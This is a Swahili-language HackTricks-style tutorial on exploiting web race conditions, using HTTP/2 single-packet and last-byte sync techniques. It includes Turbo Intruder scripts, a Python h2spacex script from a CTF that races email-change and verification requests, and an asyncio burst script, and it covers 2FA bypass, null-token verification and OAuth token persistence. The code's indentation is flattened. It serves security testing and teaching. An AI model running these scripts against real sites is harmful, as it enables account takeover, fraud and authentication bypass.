# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Kwa kupata uelewa wa kina wa mbinu hii angalia ripoti ya asili katika [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Kuongeza Race Condition Attacks

Kizuizi kikuu katika kuchukua faida ya race conditions ni kuhakikisha kwamba requests nyingi zinashughulikiwa kwa wakati mmoja, na tofauti ndogo sana katika nyakati zao za usindikaji—ikiwa inawezekana, chini ya 1ms.

Hapa unaweza kupata baadhi ya mbinu za kuoanisha Requests:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Inaruhusu kutuma two requests juu ya single TCP connection, ikipunguza athari ya network jitter. Hata hivyo, kutokana na tofauti upande wa server, requests mbili zinaweza zisitoshe kwa exploit thabiti ya race condition.
- **HTTP/1.1 'Last-Byte Sync'**: Inawawezesha kupeleka mapema sehemu kubwa za requests 20-30, ukihifadhi kipande kidogo, ambacho kisha kinatumwa pamoja, ukifikia kuwasili kwa wakati mmoja kwenye server.

**Preparation for Last-Byte Sync** inajumuisha:

1. Kutuma headers na body data bila byte ya mwisho bila kumaliza stream.
2. Kusimama kwa 100ms baada ya kutuma awali.
3. Kuzima TCP_NODELAY ili kutumia Nagle's algorithm kwa ajili ya kuunganisha final frames.
4. Kufanya ping ili kupasha moto connection.

Kutumwa kwa frames zilizohifadhiwa baadaye kunapaswa kusababisha kuwasili kwao katika packet moja, kinachothibitishwa kupitia Wireshark. Mbinu hii haifanyi kazi kwa static files, ambazo kwa kawaida hazihusiki katika RC attacks.

### Kuendana na Server Architecture

Kuelewa usanifu wa lengo ni muhimu. Front-end servers zinaweza kupitisha requests kwa njia tofauti, na hivyo kuathiri timing. Kupasha moto upande wa server kwa mapema, kupitia requests zisizo na maana, kunaweza kusawazisha timing ya requests.

#### Kushughulikia Session-Based Locking

Frameworks kama PHP's session handler hurasimisha requests kwa session, jambo ambalo linaweza kuficha udhaifu. Kutumia session tokens tofauti kwa kila request kunaweza kuepuka tatizo hili.

#### Kupita Rate au Resource Limits

Ikiwa kupasha moto connection hakufanyi kazi, kusababisha kwa makusudi ucheleweshaji wa rate au resource limits za web servers kwa kupeleka wingi wa dummy requests kunaweza kuwezesha single-packet attack kwa kusababisha ucheleweshaji upande wa server unaofaa kwa race conditions.

## Mifano ya Attack

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: Unaweza kutuma request kwa **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), unaweza kubadilisha katika request thamani unayotaka ku-bruteforce kwa **`%s`** kama katika `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` na kisha uchague **`examples/race-single-packer-attack.py`** kutoka kwenye drop down:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

If you are going to **send different values**, you could modify the code with this one that uses a wordlist from the clipboard:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Ikiwa tovuti haisaidii HTTP2 (inaungwa mkono tu HTTP1.1) tumia `Engine.THREADED` au `Engine.BURP` badala ya `Engine.BURP2`.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: Ikiwa unahitaji kutuma request kwa 1 endpoint kisha nyingi kwa endpoints nyingine ili kusababisha RCE, unaweza kubadilisha script `race-single-packet-attack.py` kwa kitu kama:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Inapatikana pia katika **Repeater** kupitia chaguo mpya '**Send group in parallel**' katika Burp Suite.
- Kwa ajili ya **limit-overrun** unaweza tu kuongeza **same request 50 times** katika kikundi.
- Kwa **connection warming**, unaweza **add** katika **beginning** ya **group** baadhi ya **requests** kwa sehemu isiyo-static ya web server.
- Kwa **delaying** mchakato **between** kusindika **one request and another** katika hatua 2 za substates, unaweza **add extra requests between** ombi zote mbili.
- Kwa **multi-endpoint** RC unaweza kuanza kutuma **request** ambayo **goes to the hidden state** kisha mara tu baada yake **50 requests** ambazo **exploits the hidden state**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Lengo la script hii ni kubadilisha barua pepe ya mtumiaji huku ikiiendelea kuthibitisha hadi tokeni ya uthibitisho ya barua pepe mpya ifike kwenye barua pepe ya awali (hii ni kwa sababu katika code ilikuwa ikiona RC ambapo ilikuwa inawezekana kubadilisha barua pepe lakini uthibitisho ukatumwa kwa ile ya zamani kwa sababu variable iliyoonyesha barua pepe ilishajazwa na ile ya kwanza).\
Tukipata neno "objetivo" katika barua pepe zinazopokelewa tunajua tumepokea tokeni ya uthibitisho ya barua pepe iliyobadilishwa na tunamaliza shambulio.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: vidokezo vya engine na gating

- Uchaguzi wa engine: tumia `Engine.BURP2` kwa malengo ya HTTP/2 ili kusababisha single‑packet attack; rejea kwa `Engine.THREADED` au `Engine.BURP` kwa HTTP/1.1 last‑byte sync.
- `gate`/`openGate`: queue many copies with `gate='race1'` (or per‑attempt gates), ambazo hushikilia tail ya kila request; `openGate('race1')` flushes all tails together ili zifikie karibu kwa wakati mmoja.
- Diagnostics: timestamps hasi kwenye Turbo Intruder zinaonyesha server ilijibu kabla request ilifikia kutumwa kwa ukamilifu, ikithibitisha overlap. Hii inatarajiwa katika races halisi.
- Connection warming: tuma ping au requests chache zisizo hatari kwanza ili kusawazisha nyakati; hiari, zimaza `TCP_NODELAY` ili kuhimiza batching ya frames za mwisho.


### Kuboresha Single Packet Attack

Katika utafiti wa awali ilielezwa kuwa attack hii ina kikomo cha 1,500 bytes. Hata hivyo, katika [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), ilielezwa jinsi inavyowezekana kupanua kikomo cha 1,500-byte cha single packet attack hadi kikomo cha dirisha cha **65,535 B** cha TCP kwa kutumia IP layer fragmentation (kugawanya single packet kuwa multiple IP packets) na kuzituma kwa mpangilio tofauti, jambo lililoruhusu kuzuia reassembling ya packet hadi fragments zote zifikie server. Mbinu hii ilimruhusu mchambuzi kutuma requests 10,000 kwa takriban 166ms.

Kumbuka kwamba ingawa kuboresha hii inafanya attack kuwa ya kuaminika zaidi katika RC zinazohitaji mamia/elfu za packets kufika kwa wakati mmoja, inaweza pia kuwa na vizingiti vya programu. Baadhi ya HTTP servers maarufu kama Apache, Nginx na Go zina setting kali ya `SETTINGS_MAX_CONCURRENT_STREAMS` kwa 100, 128 na 250. Hata hivyo, wengine kama NodeJS na nghttp2 wana kikomo kisicho na kikomo.\
Hii kwa msingi inamaanisha kwamba Apache itazingatia tu connections 100 za HTTP kutoka kwa single TCP connection (kuzuia attack hii ya RC).

Unaweza kupata baadhi ya mifano ikitumia teknik hii kwenye repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Kabla ya utafiti uliopita hizi zilikuwa baadhi ya payloads zilizotumika ambazo zilijaribu tu kutuma packets kwa kasi iwezekanavyo ili kusababisha RC.

- **Repeater:** Angalia mifano kutoka sehemu iliyopita.
- **Intruder**: Tuma **request** kwa **Intruder**, weka **number of threads** kwa **30** ndani ya **Options menu and,** chagua kama payload **Null payloads** na tengeneza **30.**
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **Mbinu za RC**

### Limit-overrun / TOCTOU

Hii ni aina ya msingi kabisa ya race condition ambapo **vulnerabilities** ambazo **zinaonekana** katika maeneo ambayo **zinaweka kikomo kwa idadi ya mara unaweza kufanya kitendo**. Kama kutumia code ileile ya punguzo kwenye duka la mtandaoni mara nyingi. Mfano rahisi unaweza kupatikana katika [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) au katika [**this bug**](https://hackerone.com/reports/759247)**.**

Kuna utofauti mwingi wa aina hii ya shambulio, ikijumuisha:

- Kutumia kadi ya zawadi mara nyingi
- Kupatia bidhaa tathmini mara nyingi
- Kutoa au kuhamisha pesa zaidi ya salio la akaunti yako
- Kutumia tena suluhisho moja la CAPTCHA
- Kuepuka kikomo cha kiwango cha anti-brute-force

### **Hali ndogo zilizofichwa**

Kufaida na race conditions tata mara nyingi kunahusisha kuchukua fursa ya nafasi fupi za kuingiliana na **hali ndogo za mashine zisizokusudiwa**. Haya ni hatua za kuifuata:

1. **Tambua Hali Ndogo Zilizowezekana**
- Anza kwa kubainisha endpoints ambazo hubadilisha au kuingiliana na data muhimu, kama user profiles au password reset processes. Lenga kwenye:
- **Storage**: Tumia endpoints zinazoshughulikia server-side persistent data badala ya zile zinazoshughulikia data client-side.
- **Action**: Tafuta operations zinazoibadilisha data iliyopo, ambazo zina uwezekano mkubwa zaidi wa kuunda masharti ya kutumika ikilinganishwa na zile zinazoongeza data mpya.
- **Keying**: Successful attacks kawaida zinahusisha operations zinazoelekezwa kwa kitambulisho kimoja, mfano username au reset token.
2. **Fanya Uchunguzi wa Awali**
- Jaribu endpoints ulizobainisha kwa race condition attacks, ukitazama utofauti wowote na matokeo yaliyotarajiwa. Majibu yasiyotegemewa au mabadiliko katika tabia ya application yanaweza kuashiria udhaifu.
3. **Onyesha Udhaifu**
- Punguza shambulio hadi idadi ndogo ya requests zinazohitajika ili kutekeleza udhaifu, mara nyingi mbili tu. Hatua hii inaweza kuhitaji majaribio mengi au automation kutokana na wakati wa kuendana unaohitajika.

### Shambulio Zinazotegemea Wakati

Usahihi wa kupanga wakati wa requests unaweza kufichua vulnerabilities, hasa wakati mbinu zinazotarajiwa kama timestamps zinatumiwa kwa security tokens. Kwa mfano, kuunda password reset tokens kulingana na timestamps kunaweza kuruhusu token sawa kwa requests zinazofanywa kwa wakati mmoja.

**Ili Kufaidi:**

- Tumia timing sahihi, kama single packet attack, kutuma concurrent password reset requests. Token zinazofanana zinaashiria udhaifu.

**Mfano:**

- Omba password reset tokens mbili kwa wakati mmoja na uzilinganishe. Token zinazofanana zinapendekeza kasoro katika token generation.

Angalia hii [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) ili kujaribu hii.

## Masomo ya kesi za Hali ndogo zilizofichwa

### Lipa & ongeza Kitu

Angalia hii [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) kuona jinsi ya **kulipa** katika duka na **kuongeza kipengee cha ziada** ambacho **huta hitaji kulipia**.

### Thibitisha barua pepe nyingine

Mawazo ni **kuhakiki anwani ya barua pepe na kuibadilisha kwa nyingine kwa wakati mmoja** ili kugundua kama jukwaa linathibitisha ile mpya iliyobadilishwa.

### Badilisha barua pepe kuwa anwani 2 kwa msingi wa Cookie

Kwa mujibu wa [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab ilikuwa hatarini kwa takeover kwa njia hii kwa sababu inaweza **kutuma** **email verification token ya barua moja kwa barua nyingine**.

Angalia hii [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) ili kujaribu hii.

### Hali Ndogo za Database / Kupitisha Uthibitisho

Ikiwa **2 different writes** zitatumika ku**ongeza** **taarifa** ndani ya **database**, kuna sehemu ndogo ya muda ambapo **data ya kwanza tu imeandikwa** ndani ya database. Kwa mfano, wakati wa kuunda user, **username** na **password** zinaweza **kuandikwa** kisha **token** ya kuthibitisha akaunti mpya imeandikwa. Hii inamaanisha kwa muda mfupi **token ya kuthibitisha akaunti iko null**.

Hivyo, kujisajili akaunti na kutuma requests kadhaa zenye token tupu (`token=` au `token[]=` au utofauti mwingine wowote) kuthibitisha akaunti mara moja kunaweza kuruhusu kuthibitisha akaunti ambapo huna udhibiti wa barua pepe.

Angalia hii [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) ili kujaribu hii.

### Bypass 2FA

Pseudo-code ifuatayo iko wazi kwa race condition kwa sababu kwa muda mfupi sana **2FA haisitishwa** wakati session inaundwa:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### Udumu wa kudumu wa OAuth2

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Huduma hizi zitakuwezesha kuunda application na kuthibitisha watumiaji ambao provider amewasajili. Ili kufanya hivyo, **client** itahitaji **kuruhusu application yako** kufikia baadhi ya data zao ndani ya **OAUth provider**.\  
Hadi hapa ni login ya kawaida na google/linkedin/github... ambapo utaonyeshwa ukurasa ukiwaambia: "_Application \<InsertCoolName> wants to access you information, do you want to allow it?_"

#### Race Condition katika `authorization_code`

The **problem** inaonekana unapo **ikubali** na inatuma moja kwa moja **`authorization_code`** kwa application mbaya. Kisha, application hii inatumia Race Condition katika OAUth service provider kutiwa nguvu kuunda zaidi ya AT/RT moja (Authentication Token/Refresh Token) kutoka kwa **`authorization_code`** ya akaunti yako. Kwa msingi, itatumia ukweli kwamba umemuomba application kufikia data zako ili **kuunda akaunti nyingi**. Kisha, ikiwa utaacha kuruhusu application kufikia data zako, jozi moja ya AT/RT itafutwa, lakini zingine zitasalia kuwa halali.

#### Race Condition katika `Refresh Token`

Mara utakapo **kupata RT halali** unaweza kujaribu **kuitumia vibaya ili kuunda AT/RT nyingi** na **hata kama mtumiaji ataghairi ruhusa** kwa application mbaya kufikia data yake, **RT nyingi zitasalia kuwa halali.**

## **RC katika WebSockets**

- Katika [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) utapata PoC ya Java ya kutuma ujumbe za websocket kwa wakati mmoja ili kuutumia vibaya Race Conditions pia katika Web Sockets.
- Kwa WebSocket Turbo Intruder ya Burp unaweza kutumia engine ya **THREADED** kuanzisha connections nyingi za WS na kutuma payloads kwa wakati mmoja. Anza na mfano rasmi na panga `config()` (idadi ya thread) kwa concurrency; mara nyingi hii ni ya kuaminika zaidi kuliko kumpakua kwenye connection moja wakati ukipigana na server‑side state kupitia WS handlers. Angalia [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## Marejeo

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
